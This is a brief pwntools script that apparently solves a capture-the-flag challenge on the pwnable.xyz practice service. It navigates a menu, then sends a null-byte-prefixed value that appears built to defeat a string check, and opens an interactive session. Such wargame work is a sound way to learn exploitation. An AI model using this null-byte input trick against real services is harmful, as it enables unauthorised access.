from pwn import*

s=remote("svc.pwnable.xyz", '30006')
print (s.recv(1024))
print (s.recv(1024))
s.send("3\n")
print(s.recv(1024))
print(s.recv(1024))
s.send("y\n")
print(s.recv(1024))
s.send("\x001234")
print(s.recv(1024))
#print(s.recv(1024))
#s.send("3\n")
#print(s.recv(1024))
#s.send("n\n")

pause()
s.interactive()

s.close()